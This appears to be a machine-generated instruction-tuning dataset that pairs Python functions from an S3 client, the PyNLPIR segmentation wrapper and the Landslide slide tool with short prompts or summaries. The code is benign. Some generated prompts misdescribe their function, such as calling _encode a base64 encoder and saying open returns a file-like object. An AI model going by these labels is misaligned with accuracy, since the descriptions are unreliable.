{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ninitiate a multipart PUT operation for a part number or single PUT object. :param bucket_name: Bucket name for the multipart request. :param object_name: Object name for the multipart request. :param part_metadata: Part-data and metadata for the multipart request. :param upload_id: Upload id of the multipart request [OPTIONAL]. :param part_number: Part number of the data to be uploaded [OPTIONAL]. :param metadata: Any additional metadata to be uploaded along with your object. :param progress: A progress object", "response": "def _do_put_object(self, bucket_name, object_name, part_data,\n                       part_size, upload_id='', part_number=0,\n                       metadata=None, sse=None, progress=None):\n        \"\"\"\n        Initiate a multipart PUT operation for a part number\n        or single PUT object.\n\n        :param bucket_name: Bucket name for the multipart request.\n        :param object_name: Object name for the multipart request.\n        :param part_metadata: Part-data and metadata for the multipart request.\n        :param upload_id: Upload id of the multipart request [OPTIONAL].\n        :param part_number: Part number of the data to be uploaded [OPTIONAL].\n        :param metadata: Any additional metadata to be uploaded along\n           with your object.\n        :param progress: A progress object\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        # Accept only bytes - otherwise we need to know how to encode\n        # the data to bytes before storing in the object.\n        if not isinstance(part_data, bytes):\n            raise ValueError('Input data must be bytes type')\n\n        headers = {\n            'Content-Length': part_size,\n        }\n\n        md5_base64 = ''\n        sha256_hex = ''\n        if self._is_ssl:\n            md5_base64 = get_md5_base64digest(part_data)\n            sha256_hex = _UNSIGNED_PAYLOAD\n        else:\n            sha256_hex = get_sha256_hexdigest(part_data)\n\n        if md5_base64:\n            headers['Content-Md5'] = md5_base64\n\n        if metadata:\n            headers.update(metadata)\n\n        query = {}\n        if part_number > 0 and upload_id:\n            query = {\n                'uploadId': upload_id,\n                'partNumber': str(part_number),\n            }\n            # Encryption headers for multipart uploads should\n            # be set only in the case of SSE-C.\n            if sse and sse.type() == \"SSE-C\":\n                headers.update(sse.marshal())\n        elif sse:\n            headers.update(sse.marshal())\n\n        response = self._url_open(\n            'PUT',\n            bucket_name=bucket_name,\n            object_name=object_name,\n            query=query,\n            headers=headers,\n            body=io.BytesIO(part_data),\n            content_sha256=sha256_hex\n        )\n\n        if progress:\n            # Update the 'progress' object with uploaded 'part_size'.\n            progress.update(part_size)\n        return response.headers['etag'].replace('\"', '')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _stream_put_object(self, bucket_name, object_name,\n                           data, content_size,\n                           metadata=None, sse=None,\n                           progress=None, part_size=MIN_PART_SIZE):\n        \"\"\"\n        Streaming multipart upload operation.\n\n        :param bucket_name: Bucket name of the multipart upload.\n        :param object_name: Object name of the multipart upload.\n        :param content_size: Total size of the content to be uploaded.\n        :param content_type: Content type of of the multipart upload.\n           Defaults to 'application/octet-stream'.\n        :param metadata: Any additional metadata to be uploaded along\n           with your object.\n        :param progress: A progress object\n        :param part_size: Multipart part size\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n        if not callable(getattr(data, 'read')):\n            raise ValueError(\n                'Invalid input data does not implement a callable read() method')\n\n        # get upload id.\n        upload_id = self._new_multipart_upload(bucket_name, object_name,\n                                               metadata, sse)\n\n        # Initialize variables\n        total_uploaded = 0\n        uploaded_parts = {}\n\n        # Calculate optimal part info.\n        total_parts_count, part_size, last_part_size = optimal_part_info(\n            content_size, part_size)\n\n        # Instantiate a thread pool with 3 worker threads\n        pool = ThreadPool(_PARALLEL_UPLOADERS)\n        pool.start_parallel()\n\n        # Generate new parts and upload <= current_part_size until\n        # part_number reaches total_parts_count calculated for the\n        # given size. Additionally part_manager() also provides\n        # md5digest and sha256digest for the partitioned data.\n        for part_number in range(1, total_parts_count + 1):\n            current_part_size = (part_size if part_number < total_parts_count\n                                 else last_part_size)\n\n            part_data = read_full(data, current_part_size)\n            pool.add_task(self._upload_part_routine, (bucket_name, object_name, upload_id,\n                                                      part_number, part_data, sse, progress))\n\n        try:\n            upload_result = pool.result()\n        except:\n            # Any exception that occurs sends an abort on the\n            # on-going multipart operation.\n            self._remove_incomplete_upload(bucket_name,\n                                           object_name,\n                                           upload_id)\n            raise\n\n        # Update uploaded_parts with the part uploads result\n        # and check total uploaded data.\n        while not upload_result.empty():\n            part_number, etag, total_read = upload_result.get()\n            uploaded_parts[part_number] = UploadPart(bucket_name,\n                                                     object_name,\n                                                     upload_id,\n                                                     part_number,\n                                                     etag,\n                                                     None,\n                                                     total_read)\n\n            total_uploaded += total_read\n\n        if total_uploaded != content_size:\n            msg = 'Data uploaded {0} is not equal input size ' \\\n                  '{1}'.format(total_uploaded, content_size)\n            # cleanup incomplete upload upon incorrect upload\n            # automatically\n            self._remove_incomplete_upload(bucket_name,\n                                           object_name,\n                                           upload_id)\n            raise InvalidSizeError(msg)\n\n        # Complete all multipart transactions if possible.\n        try:\n            mpart_result = self._complete_multipart_upload(bucket_name,\n                                                           object_name,\n                                                           upload_id,\n                                                           uploaded_parts)\n        except:\n            # Any exception that occurs sends an abort on the\n            # on-going multipart operation.\n            self._remove_incomplete_upload(bucket_name,\n                                           object_name,\n                                           upload_id)\n            raise\n\n        # Return etag here.\n        return mpart_result.etag", "response": "Uploads a new object to S3 using the multipart upload API."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _remove_incomplete_upload(self, bucket_name, object_name, upload_id):\n\n        # No reason to store successful response, for errors\n        # relevant exceptions are thrown.\n        self._url_open('DELETE', bucket_name=bucket_name,\n                       object_name=object_name, query={'uploadId': upload_id},\n                       headers={})", "response": "Remove incomplete multipart upload."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninitialize a new multipart upload request.", "response": "def _new_multipart_upload(self, bucket_name, object_name,\n                              metadata=None, sse=None):\n        \"\"\"\n        Initialize new multipart upload request.\n\n        :param bucket_name: Bucket name of the new multipart request.\n        :param object_name: Object name of the new multipart request.\n        :param metadata: Additional new metadata for the new object.\n        :return: Returns an upload id.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        headers = {}\n        if metadata:\n            headers.update(metadata)\n        if sse:\n            headers.update(sse.marshal())\n\n        response = self._url_open('POST', bucket_name=bucket_name,\n                                  object_name=object_name,\n                                  query={'uploads': ''},\n                                  headers=headers)\n\n        return parse_new_multipart_upload(response.data)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncompleting an active multipart upload request.", "response": "def _complete_multipart_upload(self, bucket_name, object_name,\n                                   upload_id, uploaded_parts):\n        \"\"\"\n        Complete an active multipart upload request.\n\n        :param bucket_name: Bucket name of the multipart request.\n        :param object_name: Object name of the multipart request.\n        :param upload_id: Upload id of the active multipart request.\n        :param uploaded_parts: Key, Value dictionary of uploaded parts.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n        is_non_empty_string(upload_id)\n\n        # Order uploaded parts as required by S3 specification\n        ordered_parts = []\n        for part in sorted(uploaded_parts.keys()):\n            ordered_parts.append(uploaded_parts[part])\n\n        data = xml_marshal_complete_multipart_upload(ordered_parts)\n        sha256_hex = get_sha256_hexdigest(data)\n        md5_base64 = get_md5_base64digest(data)\n\n        headers = {\n            'Content-Length': len(data),\n            'Content-Type': 'application/xml',\n            'Content-Md5': md5_base64,\n        }\n\n        response = self._url_open('POST', bucket_name=bucket_name,\n                                  object_name=object_name,\n                                  query={'uploadId': upload_id},\n                                  headers=headers, body=data,\n                                  content_sha256=sha256_hex)\n\n        return parse_multipart_upload_result(response.data)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_bucket_region(self, bucket_name):\n\n        # Region set in constructor, return right here.\n        if self._region:\n            return self._region\n\n        # get bucket location for Amazon S3.\n        region = 'us-east-1'  # default to US standard.\n        if bucket_name in self._region_map:\n            region = self._region_map[bucket_name]\n        else:\n            region = self._get_bucket_location(bucket_name)\n            self._region_map[bucket_name] = region\n\n        # Success.\n        return region", "response": "Get region based on the bucket name."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_bucket_location(self, bucket_name):\n        method = 'GET'\n        url = self._endpoint_url + '/' + bucket_name + '?location='\n        headers = {}\n        # default for all requests.\n        region = 'us-east-1'\n\n        # Region is set override.\n        if self._region:\n            return self._region\n\n        # For anonymous requests no need to get bucket location.\n        if self._access_key is None or self._secret_key is None:\n            return 'us-east-1'\n\n        # Get signature headers if any.\n        headers = sign_v4(method, url, region,\n                          headers, self._access_key,\n                          self._secret_key,\n                          self._session_token,\n                          None)\n\n        response = self._http.urlopen(method, url,\n                                      body=None,\n                                      headers=headers)\n\n        if self._trace_output_stream:\n            dump_http(method, url, headers, response,\n                      self._trace_output_stream)\n\n        if response.status != 200:\n            raise ResponseError(response, method, bucket_name).get_exception()\n\n        location = parse_location_constraint(response.data)\n        # location is empty for 'US standard region'\n        if not location:\n            return 'us-east-1'\n        # location can be 'EU' convert it to meaningful 'eu-west-1'\n        if location == 'EU':\n            return 'eu-west-1'\n        return location", "response": "Get the location of the specified bucket name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nopening a url wrapper around signature version 4 and return the url.", "response": "def _url_open(self, method, bucket_name=None, object_name=None,\n                  query=None, body=None, headers={}, content_sha256=None,\n                  preload_content=True):\n        \"\"\"\n        Open a url wrapper around signature version '4'\n           and :meth:`urllib3.PoolManager.urlopen`\n        \"\"\"\n        # HTTP headers are case insensitive filter out\n        # all duplicate headers and pick one.\n        fold_case_headers = FoldCaseDict()\n\n        # Set user agent once before executing the request.\n        fold_case_headers['User-Agent'] = self._user_agent\n        for header in headers:\n            fold_case_headers[header] = headers[header]\n\n        # Get bucket region.\n        region = self._get_bucket_region(bucket_name)\n\n        # Construct target url.\n        url = get_target_url(self._endpoint_url, bucket_name=bucket_name,\n                             object_name=object_name, bucket_region=region,\n                             query=query)\n\n        # Get signature headers if any.\n        headers = sign_v4(method, url, region,\n                          fold_case_headers, self._access_key,\n                          self._secret_key, self._session_token,\n                          content_sha256)\n\n        response = self._http.urlopen(method, url,\n                                      body=body,\n                                      headers=headers,\n                                      preload_content=preload_content)\n\n        if self._trace_output_stream:\n            dump_http(method, url, fold_case_headers, response,\n                      self._trace_output_stream)\n\n        if response.status != 200 and response.status != 204 \\\n           and response.status != 206:\n            # Upon any response error invalidate the region cache\n            # proactively for the bucket name.\n            self._delete_bucket_region(bucket_name)\n\n            # In case we did not preload_content, we need to release\n            # the connection:\n            if not preload_content:\n                response.release_conn()\n\n            supported_methods = [\n                'HEAD',\n                'GET',\n                'POST',\n                'PUT',\n                'DELETE'\n            ]\n\n            if method in supported_methods:\n                raise ResponseError(response,\n                                    method,\n                                    bucket_name,\n                                    object_name).get_exception()\n            else:\n                raise ValueError('Unsupported method returned'\n                                 ' error: {0}'.format(response.status))\n\n        return response"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nopens a new NLPIR file and return a file - like object.", "response": "def open(data_dir=nlpir.PACKAGE_DIR, encoding=ENCODING,\n         encoding_errors=ENCODING_ERRORS, license_code=None):\n    \"\"\"Initializes the NLPIR API.\n\n    This calls the function :func:`~pynlpir.nlpir.Init`.\n\n    :param str data_dir: The absolute path to the directory that has NLPIR's\n        `Data` directory (defaults to :data:`pynlpir.nlpir.PACKAGE_DIR`).\n    :param str encoding: The encoding that the Chinese source text will be in\n        (defaults to ``'utf_8'``). Possible values include ``'gbk'``,\n        ``'utf_8'``, or ``'big5'``.\n    :param str encoding_errors: The desired encoding error handling scheme.\n        Possible values include ``'strict'``, ``'ignore'``, and ``'replace'``.\n        The default error handler is 'strict' meaning that encoding errors\n        raise :class:`ValueError` (or a more codec specific subclass, such\n        as :class:`UnicodeEncodeError`).\n    :param str license_code: The license code that should be used when\n        initializing NLPIR. This is generally only used by commercial users.\n    :raises RuntimeError: The NLPIR API failed to initialize. Sometimes, NLPIR\n        leaves an error log in the current working directory or NLPIR's\n        ``Data`` directory that provides more detailed messages (but this isn't\n        always the case).\n    :raises LicenseError: The NLPIR license appears to be missing or expired.\n\n    \"\"\"\n    if license_code is None:\n        license_code = ''\n    global ENCODING\n    if encoding.lower() in ('utf_8', 'utf-8', 'u8', 'utf', 'utf8'):\n        ENCODING = 'utf_8'\n        encoding_constant = nlpir.UTF8_CODE\n    elif encoding.lower() in ('gbk', '936', 'cp936', 'ms936'):\n        ENCODING = 'gbk'\n        encoding_constant = nlpir.GBK_CODE\n    elif encoding.lower() in ('big5', 'big5-tw', 'csbig5'):\n        ENCODING = 'big5'\n        encoding_constant = nlpir.BIG5_CODE\n    else:\n        raise ValueError(\"encoding must be one of 'utf_8', 'big5', or 'gbk'.\")\n    logger.debug(\"Initializing the NLPIR API: 'data_dir': '{}', 'encoding': \"\n                 \"'{}', 'license_code': '{}'\".format(\n                     data_dir, encoding, license_code))\n\n    global ENCODING_ERRORS\n    if encoding_errors not in ('strict', 'ignore', 'replace'):\n        raise ValueError(\"encoding_errors must be one of 'strict', 'ignore', \"\n                         \"or 'replace'.\")\n    else:\n        ENCODING_ERRORS = encoding_errors\n\n    # Init in Python 3 expects bytes, not strings.\n    if is_python3 and isinstance(data_dir, str):\n        data_dir = _encode(data_dir)\n    if is_python3 and isinstance(license_code, str):\n        license_code = _encode(license_code)\n\n    if not nlpir.Init(data_dir, encoding_constant, license_code):\n        _attempt_to_raise_license_error(data_dir)\n        raise RuntimeError(\"NLPIR function 'NLPIR_Init' failed.\")\n    else:\n        logger.debug(\"NLPIR API initialized.\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _attempt_to_raise_license_error(data_dir):\n    if isinstance(data_dir, bytes):\n        data_dir = _decode(data_dir)\n    data_dir = os.path.join(data_dir, 'Data')\n\n    current_date = dt.date.today().strftime('%Y%m%d')\n    timestamp = dt.datetime.today().strftime('[%Y-%m-%d %H:%M:%S]')\n    data_files = os.listdir(data_dir)\n\n    for f in data_files:\n        if f == (current_date + '.err'):\n            file_name = os.path.join(data_dir, f)\n            with fopen(file_name) as error_file:\n                for line in error_file:\n                    if not line.startswith(timestamp):\n                        continue\n                    if 'Not valid license' in line:\n                        raise LicenseError('Your license appears to have '\n                                           'expired. Try running \"pynlpir '\n                                           'update\".')\n                    elif 'Can not open License file' in line:\n                        raise LicenseError('Your license appears to be '\n                                           'missing. Try running \"pynlpir '\n                                           'update\".')", "response": "Raise an error if NLPIR has detected a missing or expired license."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nencoding a string into a base64 - encoded version of the given encoding.", "response": "def _encode(s, encoding=None, errors=None):\n    \"\"\"Encodes *s*.\"\"\"\n    if encoding is None:\n        encoding = ENCODING\n    if errors is None:\n        errors = ENCODING_ERRORS\n    return s.encode(encoding, errors) if isinstance(s, unicode) else s"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_pos_name(code, name='parent', english=True, delimiter=':',\n                  pos_tags=pos_map.POS_MAP):\n    \"\"\"Gets the part of speech name for *code*.\n\n    Joins the names together with *delimiter* if *name* is ``'all'``.\n\n    See :func:``pynlpir.pos_map.get_pos_name`` for more information.\n\n    \"\"\"\n    pos_name = pos_map.get_pos_name(code, name, english, pos_tags=pos_tags)\n    return delimiter.join(pos_name) if name == 'all' else pos_name", "response": "Gets the part of speech name for code."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef segment(s, pos_tagging=True, pos_names='parent', pos_english=True,\n            pos_tags=pos_map.POS_MAP):\n    \"\"\"Segment Chinese text *s* using NLPIR.\n\n    The segmented tokens are returned as a list. Each item of the list is a\n    string if *pos_tagging* is `False`, e.g. ``['\u6211\u4eec', '\u662f', ...]``. If\n    *pos_tagging* is `True`, then each item is a tuple (``(token, pos)``), e.g.\n    ``[('\u6211\u4eec', 'pronoun'), ('\u662f', 'verb'), ...]``.\n\n    If *pos_tagging* is `True` and a segmented word is not recognized by\n    NLPIR's part of speech tagger, then the part of speech code/name will\n    be returned as :data:`None` (e.g. a space returns as ``(' ', None)``).\n\n    This uses the function :func:`~pynlpir.nlpir.ParagraphProcess` to segment\n    *s*.\n\n    :param s: The Chinese text to segment. *s* should be Unicode or a UTF-8\n        encoded string.\n    :param bool pos_tagging: Whether or not to include part of speech tagging\n        (defaults to ``True``).\n    :param pos_names: What type of part of speech names to return. This\n        argument is only used if *pos_tagging* is ``True``. :data:`None`\n        means only the original NLPIR part of speech code will be returned.\n        Other than :data:`None`, *pos_names* may be one of ``'parent'``,\n        ``'child'``, or ``'all'``. Defaults to ``'parent'``. ``'parent'``\n        indicates that only the most generic name should be used, e.g.\n        ``'noun'`` for ``'nsf'``. ``'child'`` indicates that the most specific\n        name should be used, e.g. ``'transcribed toponym'`` for ``'nsf'``.\n        ``'all'`` indicates that all names should be used, e.g.\n        ``'noun:toponym:transcribed toponym'`` for ``'nsf'``.\n    :type pos_names: ``str`` or :data:`None`\n    :param bool pos_english: Whether to use English or Chinese for the part\n        of speech names, e.g. ``'conjunction'`` or ``'\u8fde\u8bcd'``. Defaults to\n        ``True``. This is only used if *pos_names* is ``True``.\n    :param dict pos_tags: Custom part of speech tags to use.\n\n    \"\"\"\n    s = _decode(s)\n    s = s.strip()\n    logger.debug(\"Segmenting text with{} POS tagging: {}.\".format(\n                 '' if pos_tagging else 'out', s))\n    result = nlpir.ParagraphProcess(_encode(s), pos_tagging)\n    result = _decode(result)\n    logger.debug(\"Finished segmenting text: {}.\".format(result))\n    logger.debug(\"Formatting segmented text.\")\n    tokens = result.strip().replace('  ', ' ').split(' ')\n    tokens = [' ' if t == '' else t for t in tokens]\n    if pos_tagging:\n        for i, t in enumerate(tokens):\n            token = tuple(t.rsplit('/', 1))\n            if len(token) == 1:\n                token = (token[0], None)\n            if pos_names is not None and token[1] is not None:\n                pos_name = _get_pos_name(token[1], pos_names, pos_english,\n                                         pos_tags=pos_tags)\n                token = (token[0], pos_name)\n            tokens[i] = token\n    logger.debug(\"Formatted segmented text: {}.\".format(tokens))\n    return tokens", "response": "Segment Chinese text using NLPIR."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_key_words(s, max_words=50, weighted=False):\n    s = _decode(s)\n    logger.debug(\"Searching for up to {}{} key words in: {}.\".format(\n                 max_words, ' weighted' if weighted else '', s))\n    result = nlpir.GetKeyWords(_encode(s), max_words, weighted)\n    result = _decode(result)\n    logger.debug(\"Finished key word search: {}.\".format(result))\n    logger.debug(\"Formatting key word search results.\")\n    fresult = result.strip('#').split('#') if result else []\n    if weighted:\n        weights, words = [], []\n        for w in fresult:\n            result = w.split('/')\n            word, weight = result[0], result[2]\n            weight = _to_float(weight)\n            weights.append(weight or 0.0)\n            words.append(word)\n        fresult = zip(words, weights)\n        if is_python3:\n            # Return a list instead of a zip object in Python 3.\n            fresult = list(fresult)\n    logger.debug(\"Key words formatted: {}.\".format(fresult))\n    return fresult", "response": "Determines the key words in Chinese text s."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate NLPIR license file if it is out - of - date or missing.", "response": "def update_license_file(data_dir):\n    \"\"\"Update NLPIR license file if it is out-of-date or missing.\n\n    :param str data_dir: The NLPIR data directory that houses the license.\n    :returns bool: Whether or not an update occurred.\n\n    \"\"\"\n    license_file = os.path.join(data_dir, LICENSE_FILENAME)\n    temp_dir = tempfile.mkdtemp()\n    gh_license_filename = os.path.join(temp_dir, LICENSE_FILENAME)\n    try:\n        _, headers = urlretrieve(LICENSE_URL, gh_license_filename)\n    except IOError as e:\n        # Python 2 uses the unhelpful IOError for this. Re-raise as the more\n        # appropriate URLError.\n        raise URLError(e.strerror)\n\n    with open(gh_license_filename, 'rb') as f:\n        github_license = f.read()\n\n    try:\n        with open(license_file, 'rb') as f:\n            current_license = f.read()\n    except (IOError, OSError):\n        current_license = b''\n\n    github_digest = hashlib.sha256(github_license).hexdigest()\n    current_digest = hashlib.sha256(current_license).hexdigest()\n\n    if github_digest == current_digest:\n        return False\n\n    shutil.copyfile(gh_license_filename, license_file)\n    shutil.rmtree(temp_dir, ignore_errors=True)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nloads the NLPIR library appropriate for the user s system.", "response": "def load_library(platform, is_64bit, lib_dir=LIB_DIR):\n    \"\"\"Loads the NLPIR library appropriate for the user's system.\n\n    This function is called automatically when this module is loaded.\n\n    :param str platform: The platform identifier for the user's system.\n    :param bool is_64bit: Whether or not the user's system is 64-bit.\n    :param str lib_dir: The directory that contains the library files\n        (defaults to :data:`LIB_DIR`).\n    :raises RuntimeError: The user's platform is not supported by NLPIR.\n\n    \"\"\"\n    logger.debug(\"Loading NLPIR library file from '{}'\".format(lib_dir))\n    if platform.startswith('win') and is_64bit:\n        lib = os.path.join(lib_dir, 'NLPIR64')\n        logger.debug(\"Using library file for 64-bit Windows.\")\n    elif platform.startswith('win'):\n        lib = os.path.join(lib_dir, 'NLPIR32')\n        logger.debug(\"Using library file for 32-bit Windows.\")\n    elif platform.startswith('linux') and is_64bit:\n        lib = os.path.join(lib_dir, 'libNLPIR64.so')\n        logger.debug(\"Using library file for 64-bit GNU/Linux.\")\n    elif platform.startswith('linux'):\n        lib = os.path.join(lib_dir, 'libNLPIR32.so')\n        logger.debug(\"Using library file for 32-bit GNU/Linux.\")\n    elif platform == 'darwin':\n        lib = os.path.join(lib_dir, 'libNLPIRios.so')\n        logger.debug(\"Using library file for OSX/iOS.\")\n    else:\n        raise RuntimeError(\"Platform '{}' is not supported by NLPIR.\".format(\n                           platform))\n    lib_nlpir = cdll.LoadLibrary(lib if is_python3 else lib.encode('utf-8'))\n    logger.debug(\"NLPIR library file '{}' loaded.\".format(lib))\n    return lib_nlpir"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nretrieve the corresponding NLPIR function.", "response": "def get_func(name, argtypes=None, restype=c_int, lib=libNLPIR):\n    \"\"\"Retrieves the corresponding NLPIR function.\n\n    :param str name: The name of the NLPIR function to get.\n    :param list argtypes: A list of :mod:`ctypes` data types that correspond\n        to the function's argument types.\n    :param restype: A :mod:`ctypes` data type that corresponds to the\n        function's return type (only needed if the return type isn't\n        :class:`ctypes.c_int`).\n    :param lib: A :class:`ctypes.CDLL` instance for the NLPIR API library where\n        the function will be retrieved from (defaults to :data:`libNLPIR`).\n    :returns: The exported function. It can be called like any other Python\n        callable.\n\n    \"\"\"\n    logger.debug(\"Getting NLPIR API function: 'name': '{}', 'argtypes': '{}',\"\n                 \" 'restype': '{}'.\".format(name, argtypes, restype))\n    func = getattr(lib, name)\n    if argtypes is not None:\n        func.argtypes = argtypes\n    if restype is not c_int:\n        func.restype = restype\n    logger.debug(\"NLPIR API function '{}' retrieved.\".format(name))\n    return func"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_pos_name(pos_code, names='parent', english=True, pos_map=POS_MAP):\n    pos_code = pos_code.lower()  # Issue #10\n    if names not in ('parent', 'child', 'all'):\n        raise ValueError(\"names must be one of 'parent', 'child', or \"\n                         \"'all'; not '{}'\".format(names))\n    logger.debug(\"Getting {} POS name for '{}' formatted as '{}'.\".format(\n                 'English' if english else 'Chinese', pos_code, names))\n    for i in range(1, len(pos_code) + 1):\n        try:\n            pos_key = pos_code[0:i]\n            pos_entry = pos_map[pos_key]\n            break\n        except KeyError:\n            if i == len(pos_code):\n                logger.warning(\"part of speech not recognized: '{}'\".format(\n                               pos_code))\n                return None  # Issue #20\n    pos = (pos_entry[1 if english else 0], )\n    if names == 'parent':\n        logger.debug(\"Part of speech name found: '{}'\".format(pos[0]))\n        return pos[0]\n    if len(pos_entry) == 3 and pos_key != pos_code:\n        sub_map = pos_entry[2]\n        logger.debug(\"Found parent part of speech name '{}'. Descending to \"\n                     \"look for child name for '{}'\".format(\n                         pos_entry[1], pos_code))\n        sub_pos = _get_pos_name(pos_code, names, english, sub_map)\n\n        if names == 'all':\n            # sub_pos can be None sometimes (e.g. for a word '\u7532')\n            pos = pos + sub_pos if sub_pos else pos\n        else:\n            pos = (sub_pos, )\n\n    name = pos if names == 'all' else pos[-1]\n    logger.debug(\"Part of speech name found: '{}'\".format(name))\n    return name", "response": "Get the part of speech name for a given POS code."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_pos_name(code, name='parent', english=True, pos_tags=POS_MAP):\n    return _get_pos_name(code, name, english, pos_tags)", "response": "Returns the part of speech name for code."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nparsing and renders a text as HTML regarding current format.", "response": "def parse(self, text):\n        \"\"\"Parses and renders a text as HTML regarding current format.\n        \"\"\"\n        if self.format == 'markdown':\n            try:\n                import markdown\n            except ImportError:\n                raise RuntimeError(u\"Looks like markdown is not installed\")\n\n            if text.startswith(u'\\ufeff'):  # check for unicode BOM\n                text = text[1:]\n\n            return markdown.markdown(text, extensions=self.md_extensions)\n        elif self.format == 'restructuredtext':\n            try:\n                from landslide.rst import html_body\n            except ImportError:\n                raise RuntimeError(u\"Looks like docutils are not installed\")\n\n            html = html_body(text, input_encoding=self.encoding)\n\n            # RST generates pretty much markup to be removed in our case\n            for (pattern, replacement, mode) in self.RST_REPLACEMENTS:\n                html = re.sub(re.compile(pattern, mode), replacement, html, 0)\n\n            return html.strip()\n        elif self.format == 'textile':\n            try:\n                import textile\n            except ImportError:\n                raise RuntimeError(u\"Looks like textile is not installed\")\n\n            text = text.replace('\\n---\\n', '\\n<hr />\\n')\n\n            return textile.textile(text, encoding=self.encoding)\n        else:\n            raise NotImplementedError(u\"Unsupported format %s, cannot parse\"\n                                      % self.format)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndecode html entities from a given string", "response": "def descape(self, string, defs=None):\n        \"\"\"Decodes html entities from a given string\"\"\"\n        if defs is None:\n            defs = html_entities.entitydefs\n        f = lambda m: defs[m.group(1)] if len(m.groups()) > 0 else m.group(0)\n        return self.html_entity_re.sub(f, string)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_path_url(path, relative=False):\n    if relative:\n        return os.path.relpath(path)\n    else:\n        return 'file://%s' % os.path.abspath(path)", "response": "Returns an absolute or relative path url given a path"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef html_parts(input_string, source_path=None, destination_path=None,\n               input_encoding='unicode', doctitle=1, initial_header_level=1):\n    \"\"\"\n    Given an input string, returns a dictionary of HTML document parts.\n\n    Dictionary keys are the names of parts, and values are Unicode strings;\n    encoding is up to the client.\n\n    Parameters:\n\n    - `input_string`: A multi-line text string; required.\n    - `source_path`: Path to the source file or object.  Optional, but useful\n      for diagnostic output (system messages).\n    - `destination_path`: Path to the file or object which will receive the\n      output; optional.  Used for determining relative paths (stylesheets,\n      source links, etc.).\n    - `input_encoding`: The encoding of `input_string`.  If it is an encoded\n      8-bit string, provide the correct encoding.  If it is a Unicode string,\n      use \"unicode\", the default.\n    - `doctitle`: Disable the promotion of a lone top-level section title to\n      document title (and subsequent section title to document subtitle\n      promotion); enabled by default.\n    - `initial_header_level`: The initial level for header elements (e.g. 1\n      for \"<h1>\").\n    \"\"\"\n    overrides = {\n        'input_encoding': input_encoding,\n        'doctitle_xform': doctitle,\n        'initial_header_level': initial_header_level,\n        'report_level': 5\n    }\n\n    parts = core.publish_parts(\n        source=input_string, source_path=source_path,\n        destination_path=destination_path,\n        writer_name='html', settings_overrides=overrides)\n    return parts", "response": "Given an input string returns a dictionary of HTML document parts."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngives an input string returns an HTML fragment as a string.", "response": "def html_body(input_string, source_path=None, destination_path=None,\n              input_encoding='unicode', doctitle=1, initial_header_level=1):\n    \"\"\"\n    Given an input string, returns an HTML fragment as a string.\n\n    The return value is the contents of the <body> element.\n\n    Parameters (see `html_parts()` for the remainder):\n\n    - `output_encoding`: The desired encoding of the output.  If a Unicode\n      string is desired, use the default value of \"unicode\" .\n    \"\"\"\n    parts = html_parts(\n        input_string=input_string, source_path=source_path,\n        destination_path=destination_path,\n        input_encoding=input_encoding, doctitle=doctitle,\n        initial_header_level=initial_header_level)\n    fragment = parts['html_body']\n    return fragment"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_user_css(self, css_list):\n        if isinstance(css_list, string_types):\n            css_list = [css_list]\n\n        for css_path in css_list:\n            if css_path and css_path not in self.user_css:\n                if not os.path.exists(css_path):\n                    raise IOError('%s user css file not found' % (css_path,))\n                with codecs.open(css_path, encoding=self.encoding) as css_file:\n                    self.user_css.append({\n                        'path_url': utils.get_path_url(css_path,\n                                                       self.relative),\n                        'contents': css_file.read(),\n                    })", "response": "Adds supplementary user css files to the presentation."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_user_js(self, js_list):\n        if isinstance(js_list, string_types):\n            js_list = [js_list]\n        for js_path in js_list:\n            if js_path and js_path not in self.user_js:\n                if js_path.startswith(\"http:\"):\n                    self.user_js.append({\n                        'path_url': js_path,\n                        'contents': '',\n                    })\n                elif not os.path.exists(js_path):\n                    raise IOError('%s user js file not found' % (js_path,))\n                else:\n                    with codecs.open(js_path,\n                                     encoding=self.encoding) as js_file:\n                        self.user_js.append({\n                            'path_url': utils.get_path_url(js_path,\n                                                           self.relative),\n                            'contents': js_file.read(),\n                        })", "response": "Adds supplementary user javascript files to the presentation."}
